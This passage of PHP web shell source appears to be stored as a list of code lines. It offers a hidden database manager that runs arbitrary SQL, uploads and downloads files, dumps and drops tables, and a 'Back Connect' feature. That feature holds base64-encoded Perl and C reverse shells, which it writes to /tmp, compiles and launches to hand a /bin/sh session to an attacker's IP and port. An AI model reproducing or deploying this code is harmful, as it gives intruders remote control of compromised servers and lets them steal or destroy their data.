            "\t$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');",
            "\tformhead(array('title'=>'MYSQL Information','name'=>'dbinfo'));",
            "\tmakehide('action','sqlfile');",
            "\tp('<p>');",
            "\tp('DBHost:');",
            "\tmakeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));",
            "\tp(':');",
            "\tmakeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));",
            "\tp('DBUser:');",
            "\tmakeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));",
            "\tp('DBPass:');",
            "\tmakeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));",
            "\tp('DBName:');",
            "\tmakeinput(array('name'=>'dbname','size'=>15,'value'=>$dbname));",
            "\tp('DBCharset:');",
            "\tmakeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));",
            "\tp('</p>');",
            "\tformfoot();",
            "\tp('<form action=\"'.$self.'\" method=\"POST\" enctype=\"multipart/form-data\" name=\"mysqlfile\" id=\"mysqlfile\">');",
            "\tp('<h2>Upload file</h2>');",
            "\tp('<p><b>This operation the DB user must has FILE privilege</b></p>');",
            "\tp('<p>Save path(fullpath): <input class=\"input\" name=\"savepath\" size=\"45\" type=\"text\" /> Choose a file: <input class=\"input\" name=\"uploadfile\" type=\"file\" /> <a href=\"javascript:mysqlfile(\\'mysqlupload\\');\">Upload</a></p>');",
            "\tp('<h2>Download file</h2>');",
            "\tp('<p>File: <input class=\"input\" name=\"mysqldlfile\" size=\"115\" type=\"text\" /> <a href=\"javascript:mysqlfile(\\'mysqldown\\');\">Download</a></p>');",
            "\tmakehide('dbhost');",
            "\tmakehide('dbport');",
            "\tmakehide('dbuser');",
            "\tmakehide('dbpass');",
            "\tmakehide('dbname');",
            "\tmakehide('charset');",
            "\tmakehide('doing');",
            "\tmakehide('action','sqlfile');",
            "\tp('</form>');",
            "elseif ($action == 'sqladmin') {",
            "\t!$dbhost && $dbhost = 'localhost';",
            "\t!$dbuser && $dbuser = 'root';",
            "\t!$dbport && $dbport = '3306';",
            "\t$dbform = '<input type=\"hidden\" id=\"connect\" name=\"connect\" value=\"1\" />';",
            "\tif(isset($dbhost)){",
            "\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbhost\\\" name=\\\"dbhost\\\" value=\\\"$dbhost\\\" />\\n\";",
            "\tif(isset($dbuser)) {",
            "\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbuser\\\" name=\\\"dbuser\\\" value=\\\"$dbuser\\\" />\\n\";",
            "\tif(isset($dbpass)) {",
            "\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbpass\\\" name=\\\"dbpass\\\" value=\\\"$dbpass\\\" />\\n\";",
            "\tif(isset($dbport)) {",
            "\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbport\\\" name=\\\"dbport\\\" value=\\\"$dbport\\\" />\\n\";",
            "\tif(isset($dbname)) {",
            "\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"dbname\\\" name=\\\"dbname\\\" value=\\\"$dbname\\\" />\\n\";",
            "\tif(isset($charset)) {",
            "\t\t$dbform .= \"<input type=\\\"hidden\\\" id=\\\"charset\\\" name=\\\"charset\\\" value=\\\"$charset\\\" />\\n\";",
            "\tif ($doing == 'backupmysql' && $saveasfile) {",
            "\t\tif (!$table) {",
            "\t\t\tm('Please choose the table');",
            "\t\t} else {",
            "\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);",
            "\t\t\t$table = array_flip($table);",
            "\t\t\t$fp = @fopen($path,'w');",
            "\t\t\tif ($fp) {",
            "\t\t\t\t$result = q('SHOW tables');",
            "\t\t\t\tif (!$result) p('<h2>'.mysql_error().'</h2>');",
            "\t\t\t\t$mysqldata = '';",
            "\t\t\t\twhile ($currow = mysql_fetch_array($result)) {",
            "\t\t\t\t\tif (isset($table[$currow[0]])) {",
            "\t\t\t\t\t\tsqldumptable($currow[0], $fp);",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\tfclose($fp);",
            "\t\t\t\t$fileurl = str_replace(SA_ROOT,'',$path);",
            "\t\t\t\tm('Database has success backup to <a href=\"'.$fileurl.'\" target=\"_blank\">'.$path.'</a>');",
            "\t\t\t\tmysql_close();",
            "\t\t\t} else {",
            "\t\t\t\tm('Backup failed');",
            "\t\t\t}",
            "\tif ($insert && $insertsql) {",
            "\t\t$keystr = $valstr = $tmp = '';",
            "\t\tforeach($insertsql as $key => $val) {",
            "\t\t\tif ($val) {",
            "\t\t\t\t$keystr .= $tmp.$key;",
            "\t\t\t\t$valstr .= $tmp.\"'\".addslashes($val).\"'\";",
            "\t\t\t\t$tmp = ',';",
            "\t\t\t}",
            "\t\tif ($keystr && $valstr) {",
            "\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);",
            "\t\t\tm(q(\"INSERT INTO $tablename ($keystr) VALUES ($valstr)\") ? 'Insert new record of success' : mysql_error());",
            "\tif ($update && $insertsql && $base64) {",
            "\t\t$valstr = $tmp = '';",
            "\t\tforeach($insertsql as $key => $val) {",
            "\t\t\t$valstr .= $tmp.$key.\"='\".addslashes($val).\"'\";",
            "\t\t\t$tmp = ',';",
            "\t\tif ($valstr) {",
            "\t\t\t$where = base64_decode($base64);",
            "\t\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);",
            "\t\t\tm(q(\"UPDATE $tablename SET $valstr WHERE $where LIMIT 1\") ? 'Record updating' : mysql_error());",
            "\tif ($doing == 'del' && $base64) {",
            "\t\t$where = base64_decode($base64);",
            "\t\t$delete_sql = \"DELETE FROM $tablename WHERE $where\";",
            "\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);",
            "\t\tm(q(\"DELETE FROM $tablename WHERE $where\") ? 'Deletion record of success' : mysql_error());",
            "\tif ($tablename && $doing == 'drop') {",
            "\t\tdbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);",
            "\t\tif (q(\"DROP TABLE $tablename\")) {",
            "\t\t\tm('Drop table of success');",
            "\t\t\t$tablename = '';",
            "\t\t} else {",
            "\t\t\tm(mysql_error());",
            "\t$charsets = array(''=>'Default','gbk'=>'GBK', 'big5'=>'Big5', 'utf8'=>'UTF-8', 'latin1'=>'Latin1');",
            "\tformhead(array('title'=>'MYSQL Manager'));",
            "\tmakehide('action','sqladmin');",
            "\tp('<p>');",
            "\tp('DBHost:');",
            "\tmakeinput(array('name'=>'dbhost','size'=>20,'value'=>$dbhost));",
            "\tp(':');",
            "\tmakeinput(array('name'=>'dbport','size'=>4,'value'=>$dbport));",
            "\tp('DBUser:');",
            "\tmakeinput(array('name'=>'dbuser','size'=>15,'value'=>$dbuser));",
            "\tp('DBPass:');",
            "\tmakeinput(array('name'=>'dbpass','size'=>15,'value'=>$dbpass));",
            "\tp('DBCharset:');",
            "\tmakeselect(array('name'=>'charset','option'=>$charsets,'selected'=>$charset));",
            "\tmakeinput(array('name'=>'connect','value'=>'Connect','type'=>'submit','class'=>'bt'));",
            "\tp('</p>');",
            "\tformfoot();",
            "<script type=\"text/javascript\">",
            "function editrecord(action, base64, tablename){",
            "\tif (action == 'del') {\t\t",
            "\t\tif (!confirm('Is or isn\\'t deletion record?')) return;",
            "\t$('recordlist').doing.value=action;",
            "\t$('recordlist').base64.value=base64;",
            "\t$('recordlist').tablename.value=tablename;",
            "\t$('recordlist').submit();",
            "function moddbname(dbname) {",
            "\tif(!dbname) return;",
            "\t$('setdbname').dbname.value=dbname;",
            "\t$('setdbname').submit();",
            "function settable(tablename,doing,page) {",
            "\tif(!tablename) return;",
            "\tif (doing) {",
            "\t\t$('settable').doing.value=doing;",
            "\tif (page) {",
            "\t\t$('settable').page.value=page;",
            "\t$('settable').tablename.value=tablename;",
            "\t$('settable').submit();",
            "</script>",
            "<?php",
            "\t//????",
            "\tformhead(array('name'=>'recordlist'));",
            "\tmakehide('doing');",
            "\tmakehide('action','sqladmin');",
            "\tmakehide('base64');",
            "\tmakehide('tablename');",
            "\tp($dbform);",
            "\tformfoot();",
            "\t//?????",
            "\tformhead(array('name'=>'setdbname'));",
            "\tmakehide('action','sqladmin');",
            "\tp($dbform);",
            "\tif (!$dbname) {",
            "\t\tmakehide('dbname');",
            "\tformfoot();",
            "\t//???",
            "\tformhead(array('name'=>'settable'));",
            "\tmakehide('action','sqladmin');",
            "\tp($dbform);",
            "\tmakehide('tablename');",
            "\tmakehide('page',$page);",
            "\tmakehide('doing');",
            "\tformfoot();",
            "\t$cachetables = array();\t",
            "\t$pagenum = 30;",
            "\t$page = intval($page);",
            "\tif($page) {",
            "\t\t$start_limit = ($page - 1) * $pagenum;",
            "\t} else {",
            "\t\t$start_limit = 0;",
            "\t\t$page = 1;",
            "\tif (isset($dbhost) && isset($dbuser) && isset($dbpass) && isset($connect)) {",
            "\t\tdbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);",
            "\t\t//???????",
            "\t\t$mysqlver = mysql_get_server_info();",
            "\t\tp('<p>MySQL '.$mysqlver.' running in '.$dbhost.' as '.$dbuser.'@'.$dbhost.'</p>');",
            "\t\t$highver = $mysqlver > '4.1' ? 1 : 0;",
            "\t\t//?????",
            "\t\t$query = q(\"SHOW DATABASES\");",
            "\t\t$dbs = array();",
            "\t\t$dbs[] = '-- Select a database --';",
            "\t\twhile($db = mysql_fetch_array($query)) {",
            "\t\t\t$dbs[$db['Database']] = $db['Database'];",
            "\t\tmakeselect(array('title'=>'Please select a database:','name'=>'db[]','option'=>$dbs,'selected'=>$dbname,'onchange'=>'moddbname(this.options[this.selectedIndex].value)','newline'=>1));",
            "\t\t$tabledb = array();",
            "\t\tif ($dbname) {",
            "\t\t\tp('<p>');",
            "\t\t\tp('Current dababase: <a href=\"javascript:moddbname(\\''.$dbname.'\\');\">'.$dbname.'</a>');",
            "\t\t\tif ($tablename) {",
            "\t\t\t\tp(' | Current Table: <a href=\"javascript:settable(\\''.$tablename.'\\');\">'.$tablename.'</a> [ <a href=\"javascript:settable(\\''.$tablename.'\\', \\'insert\\');\">Insert</a> | <a href=\"javascript:settable(\\''.$tablename.'\\', \\'structure\\');\">Structure</a> | <a href=\"javascript:settable(\\''.$tablename.'\\', \\'drop\\');\">Drop</a> ]');",
            "\t\t\t}",
            "\t\t\tp('</p>');",
            "\t\t\tmysql_select_db($dbname);",
            "\t\t\t$getnumsql = '';",
            "\t\t\t$runquery = 0;",
            "\t\t\tif ($sql_query) {",
            "\t\t\t\t$runquery = 1;",
            "\t\t\t}",
            "\t\t\t$allowedit = 0;",
            "\t\t\tif ($tablename && !$sql_query) {",
            "\t\t\t\t$sql_query = \"SELECT * FROM $tablename\";",
            "\t\t\t\t$getnumsql = $sql_query;",
            "\t\t\t\t$sql_query = $sql_query.\" LIMIT $start_limit, $pagenum\";",
            "\t\t\t\t$allowedit = 1;",
            "\t\t\t}",
            "\t\t\tp('<form action=\"'.$self.'\" method=\"POST\">');",
            "\t\t\tp('<p><table width=\"200\" border=\"0\" cellpadding=\"0\" cellspacing=\"0\"><tr><td colspan=\"2\">Run SQL query/queries on database '.$dbname.':</td></tr><tr><td><textarea name=\"sql_query\" class=\"area\" style=\"width:600px;height:50px;overflow:auto;\">'.htmlspecialchars($sql_query,ENT_QUOTES).'</textarea></td><td style=\"padding:0 5px;\"><input class=\"bt\" style=\"height:50px;\" name=\"submit\" type=\"submit\" value=\"Query\" /></td></tr></table></p>');",
            "\t\t\tmakehide('tablename', $tablename);",
            "\t\t\tmakehide('action','sqladmin');",
            "\t\t\tp($dbform);",
            "\t\t\tp('</form>');",
            "\t\t\tif ($tablename || ($runquery && $sql_query)) {",
            "\t\t\t\tif ($doing == 'structure') {",
            "\t\t\t\t\t$result = q(\"SHOW COLUMNS FROM $tablename\");",
            "\t\t\t\t\t$rowdb = array();",
            "\t\t\t\t\twhile($row = mysql_fetch_array($result)) {",
            "\t\t\t\t\t\t$rowdb[] = $row;",
            "\t\t\t\t\t}",
            "\t\t\t\t\tp('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');",
            "\t\t\t\t\tp('<tr class=\"head\">');",
            "\t\t\t\t\tp('<td>Field</td>');",
            "\t\t\t\t\tp('<td>Type</td>');",
            "\t\t\t\t\tp('<td>Null</td>');",
            "\t\t\t\t\tp('<td>Key</td>');",
            "\t\t\t\t\tp('<td>Default</td>');",
            "\t\t\t\t\tp('<td>Extra</td>');",
            "\t\t\t\t\tp('</tr>');",
            "\t\t\t\t\tforeach ($rowdb as $row) {",
            "\t\t\t\t\t\t$thisbg = bg();",
            "\t\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');",
            "\t\t\t\t\t\tp('<td>'.$row['Field'].'</td>');",
            "\t\t\t\t\t\tp('<td>'.$row['Type'].'</td>');",
            "\t\t\t\t\t\tp('<td>'.$row['Null'].'&nbsp;</td>');",
            "\t\t\t\t\t\tp('<td>'.$row['Key'].'&nbsp;</td>');",
            "\t\t\t\t\t\tp('<td>'.$row['Default'].'&nbsp;</td>');",
            "\t\t\t\t\t\tp('<td>'.$row['Extra'].'&nbsp;</td>');",
            "\t\t\t\t\t\tp('</tr>');",
            "\t\t\t\t\t}",
            "\t\t\t\t\ttbfoot();",
            "\t\t\t\t} elseif ($doing == 'insert' || $doing == 'edit') {",
            "\t\t\t\t\t$result = q('SHOW COLUMNS FROM '.$tablename);",
            "\t\t\t\t\twhile ($row = mysql_fetch_array($result)) {",
            "\t\t\t\t\t\t$rowdb[] = $row;",
            "\t\t\t\t\t}",
            "\t\t\t\t\t$rs = array();",
            "\t\t\t\t\tif ($doing == 'insert') {",
            "\t\t\t\t\t\tp('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');",
            "\t\t\t\t\t} else {",
            "\t\t\t\t\t\tp('<h2>Update record in '.$tablename.' table &raquo;</h2>');",
            "\t\t\t\t\t\t$where = base64_decode($base64);",
            "\t\t\t\t\t\t$result = q(\"SELECT * FROM $tablename WHERE $where LIMIT 1\");",
            "\t\t\t\t\t\t$rs = mysql_fetch_array($result);",
            "\t\t\t\t\t}",
            "\t\t\t\t\tp('<form method=\"post\" action=\"'.$self.'\">');",
            "\t\t\t\t\tp($dbform);",
            "\t\t\t\t\tmakehide('action','sqladmin');",
            "\t\t\t\t\tmakehide('tablename',$tablename);",
            "\t\t\t\t\tp('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');",
            "\t\t\t\t\tforeach ($rowdb as $row) {",
            "\t\t\t\t\t\tif ($rs[$row['Field']]) {",
            "\t\t\t\t\t\t\t$value = htmlspecialchars($rs[$row['Field']]);",
            "\t\t\t\t\t\t} else {",
            "\t\t\t\t\t\t\t$value = '';",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t$thisbg = bg();",
            "\t\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');",
            "\t\t\t\t\t\tp('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class=\"area\" name=\"insertsql['.$row['Field'].']\" style=\"width:500px;height:60px;overflow:auto;\">'.$value.'</textarea></td></tr>');",
            "\t\t\t\t\t}",
            "\t\t\t\t\tif ($doing == 'insert') {",
            "\t\t\t\t\t\tp('<tr class=\"'.bg().'\"><td colspan=\"2\"><input class=\"bt\" type=\"submit\" name=\"insert\" value=\"Insert\" /></td></tr>');",
            "\t\t\t\t\t} else {",
            "\t\t\t\t\t\tp('<tr class=\"'.bg().'\"><td colspan=\"2\"><input class=\"bt\" type=\"submit\" name=\"update\" value=\"Update\" /></td></tr>');",
            "\t\t\t\t\t\tmakehide('base64', $base64);",
            "\t\t\t\t\t}",
            "\t\t\t\t\tp('</table></form>');",
            "\t\t\t\t} else {",
            "\t\t\t\t\t$querys = @explode(';',$sql_query);",
            "\t\t\t\t\tforeach($querys as $num=>$query) {",
            "\t\t\t\t\t\tif ($query) {",
            "\t\t\t\t\t\t\tp(\"<p><b>Query#{$num} : \".htmlspecialchars($query,ENT_QUOTES).\"</b></p>\");",
            "\t\t\t\t\t\t\tswitch(qy($query))",
            "\t\t\t\t\t\t\t{",
            "\t\t\t\t\t\t\t\tcase 0:",
            "\t\t\t\t\t\t\t\t\tp('<h2>Error : '.mysql_error().'</h2>');",
            "\t\t\t\t\t\t\t\t\tbreak;\t",
            "\t\t\t\t\t\t\t\tcase 1:",
            "\t\t\t\t\t\t\t\t\tif (strtolower(substr($query,0,13)) == 'select * from') {",
            "\t\t\t\t\t\t\t\t\t\t$allowedit = 1;",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\tif ($getnumsql) {",
            "\t\t\t\t\t\t\t\t\t\t$tatol = mysql_num_rows(q($getnumsql));",
            "\t\t\t\t\t\t\t\t\t\t$multipage = multi($tatol, $pagenum, $page, $tablename);",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\tif (!$tablename) {",
            "\t\t\t\t\t\t\t\t\t\t$sql_line = str_replace(array(\"\\r\", \"\\n\", \"\\t\"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));",
            "\t\t\t\t\t\t\t\t\t\t$sql_line = preg_replace(\"/\\/\\*[^(\\*\\/)]*\\*\\//i\", \" \", $sql_line);",
            "\t\t\t\t\t\t\t\t\t\tpreg_match_all(\"/from\\s+`{0,1}([\\w]+)`{0,1}\\s+/i\",$sql_line,$matches);",
            "\t\t\t\t\t\t\t\t\t\t$tablename = $matches[1][0];",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t$result = q($query);",
            "\t\t\t\t\t\t\t\t\tp($multipage);",
            "\t\t\t\t\t\t\t\t\tp('<table border=\"0\" cellpadding=\"3\" cellspacing=\"0\">');",
            "\t\t\t\t\t\t\t\t\tp('<tr class=\"head\">');",
            "\t\t\t\t\t\t\t\t\tif ($allowedit) p('<td>Action</td>');",
            "\t\t\t\t\t\t\t\t\t$fieldnum = @mysql_num_fields($result);",
            "\t\t\t\t\t\t\t\t\tfor($i=0;$i<$fieldnum;$i++){",
            "\t\t\t\t\t\t\t\t\t\t$name = @mysql_field_name($result, $i);",
            "\t\t\t\t\t\t\t\t\t\t$type = @mysql_field_type($result, $i);",
            "\t\t\t\t\t\t\t\t\t\t$len = @mysql_field_len($result, $i);",
            "\t\t\t\t\t\t\t\t\t\tp(\"<td nowrap>$name<br><span>$type($len)</span></td>\");",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\tp('</tr>');",
            "\t\t\t\t\t\t\t\t\twhile($mn = @mysql_fetch_assoc($result)){",
            "\t\t\t\t\t\t\t\t\t\t$thisbg = bg();",
            "\t\t\t\t\t\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');",
            "\t\t\t\t\t\t\t\t\t\t$where = $tmp = $b1 = '';",
            "\t\t\t\t\t\t\t\t\t\tforeach($mn as $key=>$inside){",
            "\t\t\t\t\t\t\t\t\t\t\tif ($inside) {",
            "\t\t\t\t\t\t\t\t\t\t\t\t$where .= $tmp.$key.\"='\".addslashes($inside).\"'\";",
            "\t\t\t\t\t\t\t\t\t\t\t\t$tmp = ' AND ';",
            "\t\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';",
            "\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t$where = base64_encode($where);",
            "\t\t\t\t\t\t\t\t\t\tif ($allowedit) p('<td nowrap><a href=\"javascript:editrecord(\\'edit\\', \\''.$where.'\\', \\''.$tablename.'\\');\">Edit</a> | <a href=\"javascript:editrecord(\\'del\\', \\''.$where.'\\', \\''.$tablename.'\\');\">Del</a></td>');",
            "\t\t\t\t\t\t\t\t\t\tp($b1);",
            "\t\t\t\t\t\t\t\t\t\tp('</tr>');",
            "\t\t\t\t\t\t\t\t\t\tunset($b1);",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\ttbfoot();",
            "\t\t\t\t\t\t\t\t\tp($multipage);",
            "\t\t\t\t\t\t\t\t\tbreak;\t",
            "\t\t\t\t\t\t\t\tcase 2:",
            "\t\t\t\t\t\t\t\t\t$ar = mysql_affected_rows();",
            "\t\t\t\t\t\t\t\t\tp('<h2>affected rows : <b>'.$ar.'</b></h2>');",
            "\t\t\t\t\t\t\t\t\tbreak;",
            "\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t} else {",
            "\t\t\t\t$query = q(\"SHOW TABLE STATUS\");",
            "\t\t\t\t$table_num = $table_rows = $data_size = 0;",
            "\t\t\t\t$tabledb = array();",
            "\t\t\t\twhile($table = mysql_fetch_array($query)) {",
            "\t\t\t\t\t$data_size = $data_size + $table['Data_length'];",
            "\t\t\t\t\t$table_rows = $table_rows + $table['Rows'];",
            "\t\t\t\t\t$table['Data_length'] = sizecount($table['Data_length']);",
            "\t\t\t\t\t$table_num++;",
            "\t\t\t\t\t$tabledb[] = $table;",
            "\t\t\t\t}",
            "\t\t\t\t$data_size = sizecount($data_size);",
            "\t\t\t\tunset($table);",
            "\t\t\t\tp('<table border=\"0\" cellpadding=\"0\" cellspacing=\"0\">');",
            "\t\t\t\tp('<form action=\"'.$self.'\" method=\"POST\">');",
            "\t\t\t\tmakehide('action','sqladmin');",
            "\t\t\t\tp($dbform);",
            "\t\t\t\tp('<tr class=\"head\">');",
            "\t\t\t\tp('<td width=\"2%\" align=\"center\"><input name=\"chkall\" value=\"on\" type=\"checkbox\" onclick=\"CheckAll(this.form)\" /></td>');",
            "\t\t\t\tp('<td>Name</td>');",
            "\t\t\t\tp('<td>Rows</td>');",
            "\t\t\t\tp('<td>Data_length</td>');",
            "\t\t\t\tp('<td>Create_time</td>');",
            "\t\t\t\tp('<td>Update_time</td>');",
            "\t\t\t\tif ($highver) {",
            "\t\t\t\t\tp('<td>Engine</td>');",
            "\t\t\t\t\tp('<td>Collation</td>');",
            "\t\t\t\t}",
            "\t\t\t\tp('</tr>');",
            "\t\t\t\tforeach ($tabledb as $key => $table) {",
            "\t\t\t\t\t$thisbg = bg();",
            "\t\t\t\t\tp('<tr class=\"'.$thisbg.'\" onmouseover=\"this.className=\\'focus\\';\" onmouseout=\"this.className=\\''.$thisbg.'\\';\">');",
            "\t\t\t\t\tp('<td align=\"center\" width=\"2%\"><input type=\"checkbox\" name=\"table[]\" value=\"'.$table['Name'].'\" /></td>');",
            "\t\t\t\t\tp('<td><a href=\"javascript:settable(\\''.$table['Name'].'\\');\">'.$table['Name'].'</a> [ <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'insert\\');\">Insert</a> | <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'structure\\');\">Structure</a> | <a href=\"javascript:settable(\\''.$table['Name'].'\\', \\'drop\\');\">Drop</a> ]</td>');",
            "\t\t\t\t\tp('<td>'.$table['Rows'].'</td>');",
            "\t\t\t\t\tp('<td>'.$table['Data_length'].'</td>');",
            "\t\t\t\t\tp('<td>'.$table['Create_time'].'</td>');",
            "\t\t\t\t\tp('<td>'.$table['Update_time'].'</td>');",
            "\t\t\t\t\tif ($highver) {",
            "\t\t\t\t\t\tp('<td>'.$table['Engine'].'</td>');",
            "\t\t\t\t\t\tp('<td>'.$table['Collation'].'</td>');",
            "\t\t\t\t\t}",
            "\t\t\t\t\tp('</tr>');",
            "\t\t\t\t}",
            "\t\t\t\tp('<tr class='.bg().'>');",
            "\t\t\t\tp('<td>&nbsp;</td>');",
            "\t\t\t\tp('<td>Total tables: '.$table_num.'</td>');",
            "\t\t\t\tp('<td>'.$table_rows.'</td>');",
            "\t\t\t\tp('<td>'.$data_size.'</td>');",
            "\t\t\t\tp('<td colspan=\"'.($highver ? 4 : 2).'\">&nbsp;</td>');",
            "\t\t\t\tp('</tr>');",
            "\t\t\t\tp(\"<tr class=\\\"\".bg().\"\\\"><td colspan=\\\"\".($highver ? 8 : 6).\"\\\"><input name=\\\"saveasfile\\\" value=\\\"1\\\" type=\\\"checkbox\\\" /> Save as file <input class=\\\"input\\\" name=\\\"path\\\" value=\\\"\".SA_ROOT.$_SERVER['HTTP_HOST'].\"_MySQL.sql\\\" type=\\\"text\\\" size=\\\"60\\\" /> <input class=\\\"bt\\\" type=\\\"submit\\\" name=\\\"downrar\\\" value=\\\"Export selection table\\\" /></td></tr>\");",
            "\t\t\t\tmakehide('doing','backupmysql');",
            "\t\t\t\tformfoot();",
            "\t\t\t\tp(\"</table>\");",
            "\t\t\t\tfr($query);",
            "\t\t\t}",
            "\ttbfoot();",
            "\t@mysql_close();",
            "}//end sql backup",
            "elseif ($action == 'backconnect') {",
            "\t!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];",
            "\t!$yourport && $yourport = '12345';",
            "\t$usedb = array('perl'=>'perl','c'=>'c');",
            "\t$back_connect=\"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj\".",
            "\t\t\"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR\".",
            "\t\t\"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT\".",
            "\t\t\"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI\".",
            "\t\t\"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi\".",
            "\t\t\"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl\".",
            "\t\t\"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==\";",
            "\t$back_connect_c=\"I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC\".",
            "\t\t\"BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb\".",
            "\t\t\"SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd\".",
            "\t\t\"KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ\".",
            "\t\t\"sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC\".",
            "\t\t\"Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D\".",
            "\t\t\"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp\".",
            "\t\t\"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==\";",
            "\tif ($start && $yourip && $yourport && $use){",
            "\t\tif ($use == 'perl') {",
            "\t\t\tcf('/tmp/angel_bc',$back_connect);",
            "\t\t\t$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");",
            "\t\t} else {",
            "\t\t\tcf('/tmp/angel_bc.c',$back_connect_c);",
            "\t\t\t$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');",
            "\t\t\t@unlink('/tmp/angel_bc.c');",
            "\t\t\t$res = execute(\"/tmp/angel_bc $yourip $yourport &\");",
            "\t\tm(\"Now script try connect to $yourip port $yourport ...\");",
            "\tformhead(array('title'=>'Back Connect'));",
            "\tmakehide('action','backconnect');",
            "\tp('<p>');",
            "\tp('Your IP:');",
            "\tmakeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));",
            "\tp('Your Port:');",
            "\tmakeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));",
            "\tp('Use:');",
